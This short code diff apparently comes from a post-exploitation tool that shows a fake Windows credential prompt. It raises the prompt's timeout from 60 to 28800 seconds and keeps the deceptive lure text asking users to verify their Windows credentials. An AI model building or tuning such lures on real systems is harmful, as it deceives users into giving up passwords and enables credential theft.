@@ -7,7 +7,7 @@
 #include "Askcreds.h"
 #include "beacon.h"
 
-#define TIMEOUT 60
+#define TIMEOUT 28800
 #define REASON L"Restore Network Connection"
 #define MESSAGE L"Please verify your Windows user credentials to proceed."
 
